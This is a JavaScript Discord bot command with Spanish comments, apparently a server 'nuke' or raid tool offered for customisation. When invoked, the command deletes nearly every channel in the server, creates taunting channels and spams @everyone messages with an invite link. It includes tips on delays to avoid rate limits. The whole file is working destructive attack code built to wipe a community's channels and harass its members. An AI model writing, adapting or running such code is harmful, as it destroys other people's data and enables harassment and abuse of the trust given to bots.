if (command === 'vale') {
    // Solo tú puedes usarlo (agrega más IDs si quieres)
    if (!OWNER_IDS.includes(message.author.id)) {
        return message.reply('No tienes permiso para este comando tan heavy.');
    }

    // ────────────────────────────────────────────────
    //     === PERSONALIZA AQUÍ TODO LO QUE QUIERAS ===
    // ────────────────────────────────────────────────

    const nombresDeCanales = [
        "raid-for-$pwm$-jajaja",     // repite esta línea las veces que quieras canales iguales
        "raid-for-$pwm$-jajaja",
        "raid-for-$pwm$-jajaja",
        "raid-for-$pwm$-jajaja",
        "you-are-idiot-owned-by-vale",
        "you-are-idiot-owned-by-vale",
        // Agrega más líneas aquí para más canales
    ];

    const mensajesEnRafaga = [
        "@everyone entra si quieres recuperar llorar JAJAJA: https://discord.gg/fNmMktGJ",
        "@everyone raid for $pwm$ JAJAJAJA you are idiot",
        "@everyoneraid for $pwm$ JAJAJAJA you are idiot",
        "@everyoneraid for $pwm$ JAJAJAJA you are idiot",
        "@everyone entra si quieres  llorar JAJAJA: https://discord.gg/fNmMktGJ",
        "@everyone entra si quieres  llorar JAJAJA: https://discord.gg/fNmMktGJ",
        "@everyone entra si quieres llorar JAJAJA: https://discord.gg/fNmMktGJ",
        "@everyone entra si quieres recuperar llorar JAJAJA: https://discord.gg/fNmMktGJ",
        "@everyone entra si quieres recuperar llorar JAJAJA: https://discord.gg/fNmMktGJ",
        // Agrega o quita mensajes aquí → se envían TODOS en cada canal, en este orden
    ];

    const delayEntreMensajes = 1300;   // 1.3 segundos entre cada mensaje (sube a 2000 si te da rate limit)

    // ────────────────────────────────────────────────
    //     NO CAMBIES NADA DE AQUÍ PARA ABAJO (o con cuidado)
    // ────────────────────────────────────────────────

    const totalCanales = nombresDeCanales.length;
    const totalMensajesPorCanal = mensajesEnRafaga.length;

    await message.reply(
        `**¡NUKE PERSONALIZADO INICIANDO EN 5 SEGUNDOS!**\n\n` +
        `→ Creando **${totalCanales}** canales\n` +
        `→ Enviando **${totalMensajesPorCanal}** mensajes en ráfaga en CADA canal\n\n` +
        `¡Ctrl + C en la consola si te arrepientes!`
    );

    await new Promise(r => setTimeout(r, 5000));

    const guild = message.guild;

    try {
        // 1. Borrar canales (menos el actual para ver logs)
        let borrados = 0;
        for (const ch of [...guild.channels.cache.values()]) {
            if (ch.deletable && ch.id !== message.channel.id) {
                try {
                    await ch.delete('!vale - personalizado por Patricio');
                    borrados++;
                    await new Promise(r => setTimeout(r, 400));
                } catch {}
            }
        }
        await message.channel.send(`→ Borrados **${borrados}** canales.`);

        // 2. Crear los canales personalizados
        const nuevosCanales = [];
        for (const nombre of nombresDeCanales) {
            try {
                const nombreLimpio = nombre
                    .toLowerCase()
                    .replace(/[^a-z0-9\-_$ ]/g, '')   // solo permite letras, números, -, _, espacio, $
                    .slice(0, 100) || 'raid-default';

                const canal = await guild.channels.create({
                    name: nombreLimpio,
                    type: ChannelType.GuildText,
                    permissionOverwrites: [
                        { id: guild.id, allow: ['ViewChannel', 'SendMessages'] }
                    ]
                });
                nuevosCanales.push(canal);
                await new Promise(r => setTimeout(r, 900));
            } catch (err) {
                console.log(`Error creando "${nombre}": ${err}`);
            }
        }
        await message.channel.send(`→ Creados **${nuevosCanales.length}** canales.`);

        // 3. Enviar ráfaga de mensajes personalizados en cada canal
        for (const canal of nuevosCanales) {
            try {
                for (const mensaje of mensajesEnRafaga) {
                    await canal.send(mensaje);
                    await new Promise(r => setTimeout(r, delayEntreMensajes));
                }
            } catch {}
        }

        await message.channel.send('**¡TERMINADO!** 😈 Todo raideado con tus mensajes personalizados.');

    } catch (err) {
        console.error('Error en !vale:', err);
        await message.channel.send('Algo salió mal... revisa la consola.');
    }
}